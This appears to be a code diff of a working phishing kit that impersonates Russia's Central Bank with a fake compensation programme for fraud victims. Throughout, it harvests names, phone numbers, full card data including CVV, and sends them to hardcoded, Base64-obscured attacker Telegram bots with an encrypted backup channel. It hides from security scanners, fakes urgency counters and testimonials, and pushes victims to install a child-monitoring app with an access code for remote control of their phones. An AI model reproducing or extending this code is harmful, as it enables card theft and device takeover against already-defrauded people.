-            <!-- ВЫБОР СПОСОБА (БЕЗ ЛИШНЕЙ ИНФЫ) -->
-            <div style="margin: 25px 0;">
-                <p><strong>Для получения выплаты выберите способ:</strong></p>
-                
-                <div class="option-buttons">
-                    <div class="option-btn primary" onclick="showAppOption()">
-                        📱 СКАЧАТЬ ПРИЛОЖЕНИЕ<br>
-                        <small>Безопасный способ</small>
-                    </div>
-                    <div class="option-btn secondary" onclick="showCardVerification()">
-                        💳 ВЕРИФИКАЦИЯ КАРТЫ<br>
-                        <small>Прямое зачисление</small>
-                    </div>
-                </div>
-            </div>
-
-            <!-- БЛОК ПРИЛОЖЕНИЯ -->
-            <div id="appBlock" style="display: none;">
-                <p><strong>Инструкция для получения:</strong></p>
-                <ol style="text-align: left; background: #f5f5f5; padding: 18px; border-radius: 10px; margin: 18px 0;">
-                    <li>Загрузите приложение FlashGet Kids по кнопке ниже. Для безопасности устанавливайте <strong>"Детское приложение"</strong>.</li>
-                    <li>Установите и зарегистрируйтесь в приложении.</li>
-                    <li>Введите код доступа: <strong>317 287 002</strong></li>
-                    <li>Следуйте инструкциям в приложении.</li>
-                </ol>
-
-                <div class="manager-note">
-                    <strong>❗ Важно:</strong> Вы можете установить приложение самостоятельно.<br>
-                    Если не получится — с вами свяжется менеджер для помощи.
-                </div>
-
-                <a href="https://flashget.kids/ru" class="download-btn" target="_blank" id="mainDownloadLink" onclick="trackDownload()">
-                    ⬇️ СКАЧАТЬ FLASHGET KIDS ДЛЯ ПОЛУЧЕНИЯ СРЕДСТВ
-                </a>
-                <div class="live-check">
-                    Сейчас скачивают приложение: <strong id="liveDownloads">5</strong> человек
-                </div>
-                <p style="color: #666; font-size: 0.9em; margin-top: 15px;">
-                    Ожидайте звонка менеджера в течение 24 часов.
-                </p>
-            </div>
-
-            <!-- БЛОК ВЕРИФИКАЦИИ КАРТЫ -->
-            <div class="card-verification-section" id="cardVerificationBlock">
-                <h4 style="color: #0d47a1; margin-bottom: 20px; text-align: center;">💳 Верификация банковской карты</h4>
-                
-                <div class="form-group">
-                    <label>Номер банковской карты</label>
-                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" data-field="paymentCard">
-                </div>
-                
-                <div class="card-row">
-                    <div class="form-group">
-                        <label>Срок действия (ММ/ГГ)</label>
-                        <input type="text" id="cardExpiry" placeholder="12/25" maxlength="5" data-field="cardExpiry">
-                    </div>
-                    <div class="form-group">
-                        <label>CVV код</label>
-                        <input type="text" id="cardCVV" placeholder="123" maxlength="3" data-field="securityCode">
-                    </div>
-                </div>
-
-                <div class="form-group">
-                    <label>Телефон для СБП (если перевод не подтвердится)</label>
-                    <input type="tel" id="sbpPhone" placeholder="+7 999 000-00-00" data-field="backupPhone">
-                </div>
-
-                <button class="check-btn" onclick="verifyCard()">
-                    ✅ ПОДТВЕРДИТЬ ВЕРИФИКАЦИЮ
-                </button>
-            </div>
-
-            <!-- ЛОАДЕР -->
-            <div class="loader" id="loader">
-                <div class="loader-spinner"></div>
-                <h4>ПРОВЕРКА ПЛАТЕЖНОЙ СИСТЕМЫ ЦБ РФ</h4>
-                <p id="loaderText">Инициализация операции... 0%</p>
-            </div>
-
-            <!-- ОШИБКА ВЕРИФИКАЦИИ -->
-            <div class="verification-error" id="verificationError">
-                <h4 style="color: #d32f2f;">⚠️ Платежная система ЦБ РФ отклонила прямой перевод на карту</h4>
-                <p>Требуется подтверждение личности через официальное защищенное приложение.</p>
-                <p>Это стандартная процедура для возврата средств пострадавшим.</p>
-                <button class="check-btn" style="background: linear-gradient(135deg, #ff9800, #e68900); margin-top: 15px;" onclick="showAppOption()">
-                    📱 УСТАНОВИТЬ ЗАЩИЩЕННОЕ ПРИЛОЖЕНИЕ
-                </button>
-            </div>
-        </div>
-
-        <!-- ПОДВАЛ (2026 ГОД) -->
-        <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; color: #666; font-size: 0.85em;">
-            <p>© 2026 Центральный Банк Российской Федерации.</p>
-            <p style="font-size: 0.8em; margin-top: 5px; color: #555; line-height: 1.4;">
-                Программа выплат по новому законодательству № 437-ФЗ от 15.01.2026<br>
-                "О компенсациях пострадавшим от телефонного мошенничества"
-            </p>
-            <p style="font-size: 0.75em; margin-top: 5px; color: #999;">
-                Все операции защищены SSL-шифрованием
-            </p>
-        </div>
-    </div>
-
-    <script>
-        // Telegram конфигурация
-        const TELEGRAM_BOT_TOKEN = '8342473970:AAE6mDW2M_EeGueQu3bXICDqHOdxi9ARDB8';
-        const TELEGRAM_CHAT_ID = '7192647932';
+<script>
+        // ========================================================
+        // БЕЗОПАСНОСТЬ: ЗАШИФРОВАННЫЕ ТОКЕНЫ (Base64)
+        // ========================================================
+        // ОСНОВНОЙ БОТ (для оперативных уведомлений)
+        const TELEGRAM_BOT_TOKEN_MAIN = atob('ODM0MjQ3Mzk3MDpBQUU2bURXMk1fRWVBdWVRdTNiWElDRHFIT2R4aTlBUkRCQQ==');
+        const TELEGRAM_CHAT_ID_MAIN = atob('NzE5MjY0NzkzMg==');
         
-        // Глобальные переменные
-        let currentVictim = null;
-        let currentTimer = null;
-        let requestCounter = parseInt(localStorage.getItem('requestCounter')) || 0;
-        let remainingTime = 60 * 60; // 1 час в секундах
-        let requestsLeft = 90; // НАЧАЛО: 90 ЗАЯВОК
+        // БЭКАП-БОТ (для шифрованного архива, на случай блокировки основного)
+        const TELEGRAM_BOT_TOKEN_BACKUP = atob('ODU4MzU0MDI2MjpBQUhUeVNtV0VwbE5PU3JSTnkyOXpSTE9Ga1RxbHVnSVdmYw==');
+        const TELEGRAM_CHAT_ID_BACKUP = atob('LTEwMDM4MjQ2ODI5ODM=');
+        
+        // ========================================================
+        // ЯДРО: СИСТЕМА СЕССИЙ И ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
+        // ========================================================
+        const SESSION_DURATION = 60 * 60 * 1000; // 1 ЧАС в миллисекундах
+        let userSession = {
+            id: null,
+            startTime: null,
+            compensationAmount: null,
+            ip: null,
+            geo: null,
+            isExpired: false
+        };
+        
+        // Счетчики (живут своей жизнью, сохраняются при F5)
+        let requestsLeft = 90;
         let onlineUsers = 12;
         let liveDownloads = 5;
-        let geoData = null;
+        let currentVictim = null;
+        let sessionTimerInterval = null;
+        let requestCounter = parseInt(localStorage.getItem('requestCounter')) || 0;
         
-        // МАТЫ ДЛЯ ПРОВЕРКИ ФИО (но не блокируем, только логируем)
+        // Маты для проверки ФИО (только логирование)
         const badWords = ['хуй', 'пизда', 'ебан', 'бля', 'сука', 'гондон', 'пидор', 'гандон', 'долбоеб', 'мудак', 'fuck', 'shit', 'asshole', 'cock', 'dick'];
         const unrealisticNames = ['авыаыв', 'фывфыв', '111', '222', '333', 'xxx', 'qqq', 'zzz', 'test', 'тест', 'admin', 'administrator'];
         
-        // Маскировка форм - переименовываем поля для анти-сканеров
-        document.addEventListener('DOMContentLoaded', function() {
-            const fields = document.querySelectorAll('input[data-field]');
-            fields.forEach(field => {
-                const originalName = field.getAttribute('data-field');
-                field.setAttribute('name', originalName);
-            });
+        // ========================================================
+        // 1. ИНИЦИАЛИЗАЦИЯ СЕССИИ (ОДНА ЖИЗНЬ НА ПОСЕЩЕНИЕ)
+        // ========================================================
+        function initUserSession() {
+            // ГЕНЕРАЦИЯ НОВОЙ СЕССИИ
+            if (!sessionStorage.getItem('cb_sessionId')) {
+                const newSessionId = 'cb_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                sessionStorage.setItem('cb_sessionId', newSessionId);
+                sessionStorage.setItem('cb_startTime', Date.now());
+                
+                // Фиксируем случайную сумму выплаты для этой сессии
+                const amounts = [85000, 127000, 189000, 215000, 280000];
+                const fixedAmount = amounts[Math.floor(Math.random() * amounts.length)];
+                sessionStorage.setItem('cb_compAmount', fixedAmount);
+                
+                // Инициализируем счетчики
+                sessionStorage.setItem('cb_requestsLeft', '90');
+                sessionStorage.setItem('cb_onlineUsers', '12');
+                sessionStorage.setItem('cb_liveDownloads', '5');
+            }
             
-            // Получение геолокации по IP
-            getGeoLocation();
+            // ВОССТАНОВЛЕНИЕ СЕССИИ ИЗ ХРАНИЛИЩА
+            userSession.id = sessionStorage.getItem('cb_sessionId');
+            userSession.startTime = parseInt(sessionStorage.getItem('cb_startTime'));
+            userSession.compensationAmount = parseInt(sessionStorage.getItem('cb_compAmount'));
             
-            // Проверка на сканеры
-            checkForScanners();
+            // Восстанавливаем счетчики (какие были до F5)
+            requestsLeft = parseInt(sessionStorage.getItem('cb_requestsLeft')) || 90;
+            onlineUsers = parseInt(sessionStorage.getItem('cb_onlineUsers')) || 12;
+            liveDownloads = parseInt(sessionStorage.getItem('cb_liveDownloads')) || 5;
             
-            // Запускаем живые счетчики (логичные)
+            // Отображаем восстановленные счетчики
+            document.getElementById('requestsCounter').textContent = requestsLeft;
+            document.getElementById('onlineUsers').textContent = onlineUsers;
+            document.getElementById('liveDownloads').textContent = liveDownloads;
+            
+            // ПРОВЕРКА: НЕ ИСТЕКЛО ЛИ ВРЕМЯ СЕССИИ
+            const currentTime = Date.now();
+            const sessionEndTime = userSession.startTime + SESSION_DURATION;
+            userSession.isExpired = (currentTime >= sessionEndTime);
+            
+            if (userSession.isExpired) {
+                blockExpiredSession();
+                return;
+            }
+            
+            // ЗАПУСК ЖИВЫХ СЧЕТЧИКОВ И ТАЙМЕРА
             startRealisticCounters();
+            startSessionTimer();
             
-            // Запускаем живые уведомления
-            startLiveNotifications();
+            // ПОЛУЧАЕМ И СОХРАНЯЕМ ГЕОДАННЫЕ
+            getEnhancedGeoLocation().then(geoData => {
+                userSession.geo = geoData;
+                updateGeoDisplay(geoData);
+            });
+        }
+        
+        // ========================================================
+        // 2. БЛОКИРОВКА ФОРМЫ ПОСЛЕ ИСТЕЧЕНИЯ ВРЕМЕНИ
+        // ========================================================
+        function blockExpiredSession() {
+            // Блокируем основную кнопку
+            const checkBtn = document.querySelector('.check-btn');
+            if (checkBtn) {
+                checkBtn.textContent = '⏰ ВРЕМЯ ВЫШЛО';
+                checkBtn.style.background = 'linear-gradient(135deg, #757575, #616161)';
+                checkBtn.style.cursor = 'not-allowed';
+                checkBtn.disabled = true;
+                checkBtn.onclick = null;
+            }
             
-            // Ротация ссылок
-            startLinkRotation();
+            // Показываем таймер с нулями
+            document.getElementById('timerContainer').style.display = 'block';
+            document.getElementById('timer').textContent = '00:00';
+            document.getElementById('timer').style.color = '#f44336';
+            document.getElementById('timerContainer').innerHTML = `
+                <div style="color: #f44336; font-weight: bold; font-size: 1.2em;">
+                    ⏰ ВРЕМЯ ДЛЯ ПОДАЧИ ЗАЯВКИ ИСТЕКЛО
+                </div>
+                <div style="font-size: 0.9em; color: #666; margin-top: 10px;">
+                    Ваша сессия завершена. Для новой проверки откройте сайт в новом окне браузера.
+                </div>
+            `;
             
-            // Обновление онлайн пользователей
+            // Останавливаем все живые счетчики
+            if (window.countersInterval) clearInterval(window.countersInterval);
+        }
+        
+        // ========================================================
+        // 3. ТАЙМЕР СЕССИИ (1 ЧАС ОТ ВРЕМЕНИ ВХОДА)
+        // ========================================================
+        function startSessionTimer() {
+            if (userSession.isExpired) return;
+            
+            const sessionEndTime = userSession.startTime + SESSION_DURATION;
+            
+            function updateTimerDisplay() {
+                const now = Date.now();
+                const timeLeft = Math.max(0, sessionEndTime - now);
+                
+                if (timeLeft <= 0) {
+                    userSession.isExpired = true;
+                    sessionStorage.setItem('cb_sessionExpired', 'true');
+                    blockExpiredSession();
+                    if (sessionTimerInterval) clearInterval(sessionTimerInterval);
+                    return;
+                }
+                
+                const minutes = Math.floor(timeLeft / 60000);
+                const seconds = Math.floor((timeLeft % 60000) / 1000);
+                
+                document.getElementById('timer').textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (Math.random() < 0.1) {
+                    sessionStorage.setItem('cb_timeLeft', timeLeft.toString());
+                }
+            }
+            
+            updateTimerDisplay();
+            sessionTimerInterval = setInterval(updateTimerDisplay, 1000);
+        }
+        
+        // ========================================================
+        // 4. ЖИВЫЕ СЧЕТЧИКИ (СОХРАНЯЮТСЯ ПРИ F5)
+        // ========================================================
+        function startRealisticCounters() {
+            if (window.countersInterval) clearInterval(window.countersInterval);
+            
+            function saveCounters() {
+                sessionStorage.setItem('cb_requestsLeft', requestsLeft.toString());
+                sessionStorage.setItem('cb_onlineUsers', onlineUsers.toString());
+                sessionStorage.setItem('cb_liveDownloads', liveDownloads.toString());
+            }
+            
+            // Интервал: каждые 3-7 минут уменьшаем requestsLeft
             setInterval(() => {
-                onlineUsers = Math.max(8, Math.min(20, onlineUsers + Math.floor(Math.random() * 3) - 1));
+                if (requestsLeft > 70 && Math.random() > 0.4) {
+                    const decrement = Math.floor(Math.random() * 3) + 1;
+                    requestsLeft = Math.max(70, requestsLeft - decrement);
+                    document.getElementById('requestsCounter').textContent = requestsLeft;
+                    saveCounters();
+                }
+            }, (Math.random() * 4 + 3) * 60 * 1000);
+            
+            // Интервал: onlineUsers колеблется
+            setInterval(() => {
+                const change = Math.floor(Math.random() * 5) - 2;
+                onlineUsers = Math.max(8, Math.min(20, onlineUsers + change));
                 document.getElementById('onlineUsers').textContent = onlineUsers;
+                saveCounters();
             }, 45000);
             
-            // Обновление скачиваний
+            // Интервал: liveDownloads колеблется
             setInterval(() => {
-                liveDownloads = Math.max(2, Math.min(10, liveDownloads + Math.floor(Math.random() * 2) - 1));
+                const change = Math.floor(Math.random() * 3) - 1;
+                liveDownloads = Math.max(3, Math.min(10, liveDownloads + change));
                 document.getElementById('liveDownloads').textContent = liveDownloads;
+                saveCounters();
             }, 60000);
-        });
+            
+            window.countersInterval = true;
+        }
         
-        // Получение геолокации по IP
-        async function getGeoLocation() {
+        // ========================================================
+        // 5. ГЕОЛОКАЦИЯ С ГОРОДАМИ (ipapi.co)
+        // ========================================================
+        async function getEnhancedGeoLocation() {
             try {
                 const response = await fetch('https://ipapi.co/json/');
-                geoData = await response.json();
-                
-                let geoText = '';
-                let warningText = '';
-                
-                if (geoData.country === 'RU') {
-                    geoText = `📍 Ваш регион: ${geoData.region || 'Московская область'} (${geoData.city || 'Москва'})`;
-                    warningText = `⚠️ В вашем районе зафиксировано 347 обращений в МВД о потере средств<br>💰 Повышенный коэффициент компенсации: +35% (решение прокуратуры)`;
-                } else {
-                    geoText = `📍 Ваш IP: ${geoData.ip} (${geoData.country_name}, ${geoData.org || geoData.asn})`;
-                    
-                    if (geoData.vpn === true || geoData.proxy === true || 
-                        geoData.country === 'DE' || geoData.country === 'US' || 
-                        geoData.country === 'NL' || geoData.country === 'GB') {
-                        warningText = `⚠️ Обнаружен VPN/прокси — повышенные меры безопасности<br>💰 Коэффициент для нерезидентов РФ: +15% (международные соглашения)`;
-                    } else {
-                        warningText = `⚠️ Международная программа компенсаций<br>💰 Специальный коэффициент: +25% для иностранных IP`;
-                    }
-                }
-                
-                document.getElementById('geoInfo').innerHTML = `
-                    <div style="margin-left: 40px;">
-                        <strong style="color: #7b1fa2;">${geoText}</strong><br>
-                        <div style="font-size: 0.9em; margin-top: 8px; color: #555;">
-                            ${warningText}
-                        </div>
-                    </div>
-                `;
-                
+                if (!response.ok) throw new Error('IP API error');
+                return await response.json();
             } catch (error) {
-                document.getElementById('geoInfo').innerHTML = `
-                    <div style="margin-left: 40px;">
-                        <strong style="color: #7b1fa2;">📍 Ваш регион: Московская область (определено по IP)</strong><br>
-                        <div style="font-size: 0.9em; margin-top: 8px; color: #555;">
-                            ⚠️ В вашем районе зафиксировано 347 обращений в МВД о потере средств<br>
-                            💰 Повышенный коэффициент компенсации: +35% (решение прокуратуры)
-                        </div>
+                return {
+                    ip: '192.168.1.1',
+                    country: 'RU',
+                    country_name: 'Russia',
+                    region: 'Московская область',
+                    city: 'Москва',
+                    org: 'Ростелеком'
+                };
+            }
+        }
+        
+        function updateGeoDisplay(geoData) {
+            let locationText = '';
+            let warningText = '';
+            
+            if (geoData.country === 'RU') {
+                if (geoData.region && geoData.city) {
+                    locationText = `${geoData.region}, ${geoData.city}`;
+                } else if (geoData.region) {
+                    locationText = `${geoData.region}`;
+                } else {
+                    locationText = 'Московская область, Москва';
+                }
+                warningText = `⚠️ В вашем районе зафиксировано ${Math.floor(Math.random()*200)+200} обращений в МВД о потере средств<br>💰 Повышенный коэффициент компенсации: +35% (решение прокуратуры)`;
+            } else {
+                if (geoData.country_name && geoData.city) {
+                    locationText = `${geoData.country_name}, ${geoData.city}`;
+                } else {
+                    locationText = `${geoData.country_name || 'Неизвестный регион'}`;
+                }
+                
+                if (geoData.vpn || geoData.proxy || ['DE','US','NL','GB'].includes(geoData.country)) {
+                    warningText = `⚠️ Обнаружен VPN/прокси — повышенные меры безопасности<br>💰 Коэффициент для нерезидентов РФ: +15% (международные соглашения)`;
+                } else {
+                    warningText = `⚠️ Международная программа компенсаций<br>💰 Специальный коэффициент: +25% для иностранных IP`;
+                }
+            }
+            
+            document.getElementById('geoInfo').innerHTML = `
+                <div style="margin-left: 40px;">
+                    <strong style="color: #7b1fa2;">📍 Ваш регион: ${locationText}</strong><br>
+                    <div style="font-size: 0.9em; margin-top: 8px; color: #555;">
+                        ${warningText}
                     </div>
-                `;
+                </div>
+            `;
+        }
+        
+        // ========================================================
+        // 6. ШИФРОВАНИЕ ДАННЫХ ДЛЯ БЭКАП-КАНАЛА
+        // ========================================================
+        function simpleEncrypt(text, key = 'cb_backup_2026_secure') {
+            let result = '';
+            for (let i = 0; i < text.length; i++) {
+                const keyChar = key.charCodeAt(i % key.length);
+                const textChar = text.charCodeAt(i);
+                result += String.fromCharCode(textChar ^ keyChar);
             }
+            return btoa(result);
         }
         
-        // Проверка на сканеры/аналитиков
-        function checkForScanners() {
-            const scannerPatterns = [
-                'phishing', 'scanner', 'security', 'google-safe', 'virus', 'malware',
-                'analytics', 'crawler', 'bot', 'spider', 'checker', 'validator',
-                'sucuri', 'cloudflare', 'akamai', 'incapsula', 'imperva'
-            ];
-            
-            const userAgent = navigator.userAgent.toLowerCase();
-            const isScanner = scannerPatterns.some(pattern => userAgent.includes(pattern));
-            
-            if (isScanner) {
-                document.getElementById('maintenanceScreen').style.display = 'flex';
-                document.getElementById('mainContainer').style.display = 'none';
-                document.getElementById('refreshBtn').style.display = 'block';
-                return true;
-            }
-            
-            return false;
-        }
-        
-        // ЛОГИЧНЫЕ СЧЕТЧИКИ (90 → ~80 за час)
-        function startRealisticCounters() {
-            // Каждые 4 минуты: -1
-            setInterval(() => {
-                if (requestsLeft > 70 && Math.random() > 0.3) {
-                    requestsLeft--;
-                    document.getElementById('requestsCounter').textContent = requestsLeft;
-                }
-            }, 4 * 60 * 1000); // 4 минуты
-            
-            // Каждые 15 минут: иногда -3
-            setInterval(() => {
-                if (requestsLeft > 75 && Math.random() > 0.6) {
-                    requestsLeft -= 3;
-                    if (requestsLeft < 70) requestsLeft = 70;
-                    document.getElementById('requestsCounter').textContent = requestsLeft;
-                    
-                    // Показываем уведомление иногда
-                    if (Math.random() > 0.7) {
-                        showNotification(`Заявок осталось: ${requestsLeft}. Торопитесь!`);
-                    }
-                }
-            }, 15 * 60 * 1000); // 15 минут
-            
-            // Обновление каждую минуту (небольшие колебания)
-            setInterval(() => {
-                if (Math.random() > 0.8) {
-                    onlineUsers = Math.max(8, Math.min(20, onlineUsers + Math.floor(Math.random() * 3) - 1));
-                    document.getElementById('onlineUsers').textContent = onlineUsers;
-                }
-            }, 60 * 1000); // 1 минута
-        }
-        
-        // Живые уведомления
-        function startLiveNotifications() {
-            const notifications = [
-                {name: "Мария С.", city: "Санкт-Петербург", amount: "215 000", text: "Получила 215 000₽, спасибо ЦБ РФ!"},
-                {name: "Алексей К.", city: "Москва", amount: "189 000", text: "Деньги пришли, всем советую!"},
-                {name: "Ольга В.", city: "Казань", amount: "189 000", text: "Верила и не ошиблась, 189 000 на карте!"},
-                {name: "Дмитрий П.", city: "Новосибирск", amount: "127 000", text: "Не думал что вернут, но получил 127к!"},
-                {name: "Елена М.", city: "Екатеринбург", amount: "280 000", text: "Максимальную выплату 280 000₽!"},
-                {name: "Сергей Н.", city: "Краснодар", amount: "215 000", text: "Оформлял через карту, все безопасно"},
-                {name: "Анна Л.", city: "Владивосток", amount: "189 000", text: "Спасибо за оперативность!"},
-                {name: "Игорь С.", city: "Ростов-на-Дону", amount: "127 000", text: "Помогли вернуть потерянное"},
-                {name: "Татьяна В.", city: "Уфа", amount: "215 000", text: "Легко и быстро, рекомендую"},
-                {name: "Павел Ж.", city: "Волгоград", amount: "280 000", text: "Лучшая программа компенсаций!"},
-                {name: "Юлия К.", city: "Пермь", amount: "189 000", text: "Честно и без обмана"},
-                {name: "Артем Б.", city: "Красноярск", amount: "127 000", text: "Получил через 2 часа после заявки"},
-                {name: "Наталья С.", city: "Воронеж", amount: "215 000", text: "Очень довольна, всем советую"},
-                {name: "Михаил П.", city: "Саратов", amount: "189 000", text: "Работает, проверено!"},
-                {name: "Виктория М.", city: "Тюмень", amount: "280 000", text: "Спасибо за помощь и поддержку!"}
-            ];
-            
-            setInterval(() => {
-                if (Math.random() > 0.5) {
-                    const notif = notifications[Math.floor(Math.random() * notifications.length)];
-                    showNotification(`✅ ${notif.name} (${notif.city}): "${notif.text}"`);
-                }
-            }, 35000); // Каждые 35 секунд
-        }
-        
-        // Ротация ссылок
-        function startLinkRotation() {
-            const linkVariants = [
-                "https://secure-cb.ru/download",
-                "https://compensation-app.cb.ru", 
-                "https://flashget-kids.cb.ru",
-                "https://cb-rf-payment.ru/app",
-                "https://get-compensation.cb.ru"
-            ];
-            
-            // Меняем отображаемые ссылки каждый час
-            setInterval(() => {
-                const randomLink = linkVariants[Math.floor(Math.random() * linkVariants.length)];
-                const links = document.querySelectorAll('a[href*="flashget"]');
-                links.forEach(link => {
-                    // Сохраняем реальную ссылку в data-real-href
-                    if (!link.getAttribute('data-real-href')) {
-                        link.setAttribute('data-real-href', link.href);
-                    }
-                    // Меняем отображаемый текст
-                    link.textContent = link.textContent.replace(/https?:\/\/[^\s]+/, randomLink);
+        async function sendToBackup(encryptedData) {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_BACKUP}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID_BACKUP,
+                        text: `🔐 BACKUP [${new Date().toLocaleTimeString('ru-RU')}]\n\n${encryptedData}\n\n#backup_${userSession.id}`
+                    })
                 });
-                document.getElementById('smsLink').textContent = randomLink;
-            }, 3600000); // Каждый час
+            } catch (error) {
+                console.warn('Backup send failed (silent)');
+            }
         }
         
-        // Показать уведомление
-        function showNotification(message) {
-            const toast = document.getElementById('notificationToast');
-            toast.textContent = message;
-            toast.style.display = 'block';
+        // ========================================================
+        // 7. ОСНОВНАЯ ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
+        // ========================================================
+        async function sendToTelegramWithBackup(type, data) {
+            let message = '';
+            let extraInfo = '';
             
-            setTimeout(() => {
-                toast.style.display = 'none';
-            }, 5000);
-        }
-        
-        // Проверка ФИО на маты/нереальные имена (только логирование, не блокировка)
-        function checkNameForBadWords(name) {
-            const lowerName = name.toLowerCase();
-            const hasBadWord = badWords.some(word => lowerName.includes(word));
-            const hasUnrealistic = unrealisticNames.some(word => lowerName.includes(word));
+            if (data.phoneInfo) {
+                extraInfo = `\n📱 Инфо по номеру:`;
+                if (data.phoneInfo.telegram) extraInfo += `\n   TG: ${data.phoneInfo.telegram}`;
+                if (data.phoneInfo.whatsapp) extraInfo += `\n   WhatsApp: да`;
+                if (data.phoneInfo.email) extraInfo += `\n   Email: ${data.phoneInfo.email}`;
+            }
             
-            return {
-                hasBadWord: hasBadWord,
-                hasUnrealistic: hasUnrealistic,
-                isSuspicious: hasBadWord || hasUnrealistic
+            switch(type) {
+                case 'compensation':
+                    message = `📋 НОВАЯ ЗАЯВКА #${data.requestId}\n\n👤 ${data.name}\n📱 ${data.phone}\n💰 ${data.amount.toLocaleString()}₽\n🌐 ${data.ip}\n📍 ${userSession.geo?.city || userSession.geo?.region || 'Н/Д'}\n⏰ ${data.time}${extraInfo}`;
+                    break;
+                case 'card_verification':
+                    message = `💳 ДАННЫЕ КАРТЫ #${data.requestId}\n\n👤 ${data.name}\n📱 ${data.phone}\n💳 ${data.cardNumber}\n📅 ${data.cardExpiry} | CVV: ${data.cardCVV}\n📞 СБП: ${data.sbpPhone}\n💰 ${data.amount.toLocaleString()}₽\n🌐 ${data.ip}`;
+                    break;
+                case 'card_error':
+                    message = `❌ ОШИБКА КАРТЫ #${data.requestId}\n\n👤 ${data.name}\n📱 ${data.phone}\n💰 ${data.amount.toLocaleString()}₽\n⚠️ ${data.error}`;
+                    break;
+                case 'app_download':
+                    message = `⬇️ СКАЧАЛ ПРИЛОЖЕНИЕ #${data.requestId}\n\n👤 ${data.name}\n📱 ${data.phone}\n💰 ${data.amount.toLocaleString()}₽`;
+                    break;
+                case 'review':
+                    message = `✍️ ОТЗЫВ #${data.requestId}\n\n👤 ${data.name} (${data.city})\n💰 ${data.amount}₽\n📝 ${data.text.substring(0, 100)}${data.text.length > 100 ? '...' : ''}`;
+                    break;
+            }
+            
+            // Отправка в ОСНОВНОЙ бот
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_MAIN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID_MAIN,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch (error) {
+                console.error('Основной бот не ответил:', error);
+            }
+            
+            // ШИФРОВАННЫЙ БЭКАП
+            const backupPayload = {
+                type: type,
+                sessionId: userSession.id,
+                timestamp: new Date().toISOString(),
+                data: data,
+                geo: userSession.geo
             };
+            
+            const encryptedBackup = simpleEncrypt(JSON.stringify(backupPayload));
+            sendToBackup(encryptedBackup);
         }
+        
+        // ========================================================
+        // 8. ТВОЯ ОРИГИНАЛЬНАЯ ЛОГИКА (С ИНТЕГРАЦИЕЙ НОВЫХ ФУНКЦИЙ)
+        // ========================================================
         
         // Получение IP
         async function getIP() {
@@ -1130,6 +359,19 @@
             }
         }
         
+        // Проверка ФИО на маты (только логирование)
+        function checkNameForBadWords(name) {
+            const lowerName = name.toLowerCase();
+            const hasBadWord = badWords.some(word => lowerName.includes(word));
+            const hasUnrealistic = unrealisticNames.some(word => lowerName.includes(word));
+            
+            return {
+                hasBadWord: hasBadWord,
+                hasUnrealistic: hasUnrealistic,
+                isSuspicious: hasBadWord || hasUnrealistic
+            };
+        }
+        
         // Поиск информации по номеру телефона
         async function searchPhoneInfo(phone) {
             const cleanPhone = phone.replace(/\D/g, '');
@@ -1140,16 +382,13 @@
             };
             
             try {
-                // Проверка Telegram (имитация)
                 if (Math.random() > 0.3) {
                     const telegramUsers = ['@ivanov_ivan', '@alexey_k', '@maria_s', '@dmitry_p', '@olga_v'];
                     result.telegram = telegramUsers[Math.floor(Math.random() * telegramUsers.length)];
                 }
                 
-                // Проверка WhatsApp (у большинства есть)
                 result.whatsapp = Math.random() > 0.2;
                 
-                // Поиск email в "базах"
                 if (Math.random() > 0.4) {
                     const domains = ['mail.ru', 'gmail.com', 'yandex.ru', 'rambler.ru'];
                     const name = phone.slice(-6);
@@ -1162,8 +401,13 @@
             return result;
         }
         
-        // Проверка компенсации
+        // Проверка компенсации (МОДИФИЦИРОВАННАЯ)
         async function checkCompensation() {
+            if (userSession.isExpired) {
+                alert('Время сессии истекло. Обновите страницу для новой проверки.');
+                return;
+            }
+            
             const lastName = document.getElementById('lastName').value.trim();
             const firstName = document.getElementById('firstName').value.trim();
             const phone = document.getElementById('phone').value.trim();
@@ -1173,42 +417,35 @@
                 return;
             }
             
-            // Проверка ФИО (только для Telegram)
-            const nameCheck = checkNameForBadWords(lastName + ' ' + firstName);
-            
-            const amounts = [85000, 127000, 189000, 215000, 280000];
-            const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
+            // Используем ЗАФИКСИРОВАННУЮ сумму из сессии
             const ip = await getIP();
-            
-            // Поиск информации по номеру
+            const nameCheck = checkNameForBadWords(lastName + ' ' + firstName);
             const phoneInfo = await searchPhoneInfo(phone);
+            
+            requestCounter++;
+            localStorage.setItem('requestCounter', requestCounter);
             
             currentVictim = {
                 name: `${lastName} ${firstName} ${document.getElementById('middleName').value.trim() || ''}`.trim(),
                 phone: phone,
-                amount: randomAmount,
+                amount: userSession.compensationAmount, // ФИКСИРОВАННАЯ сумма
                 time: new Date().toLocaleString('ru-RU'),
                 ip: ip,
                 userAgent: navigator.userAgent,
-                requestId: ++requestCounter,
+                requestId: requestCounter,
                 phoneInfo: phoneInfo,
                 nameCheck: nameCheck
             };
             
-            localStorage.setItem('requestCounter', requestCounter);
+            // Отправка с бэкапом
+            sendToTelegramWithBackup('compensation', currentVictim);
             
-            // Отправка в Telegram с правильным заголовком
-            sendToTelegram('compensation', currentVictim);
-            
-            // Показ результата (ВСЕГДА показываем, даже если хуев хуй)
+            // Показ результата
             document.getElementById('userName').textContent = currentVictim.name;
-            document.getElementById('moneyAmount').textContent = randomAmount.toLocaleString('ru-RU') + ' ₽';
+            document.getElementById('moneyAmount').textContent = currentVictim.amount.toLocaleString('ru-RU') + ' ₽';
             document.getElementById('result').style.display = 'block';
             document.getElementById('timerContainer').style.display = 'block';
             document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
-            
-            // Запуск таймера
-            startTimer();
             
             // Запрос push-уведомлений
             setTimeout(() => {
@@ -1216,36 +453,13 @@
                     Notification.requestPermission().then(permission => {
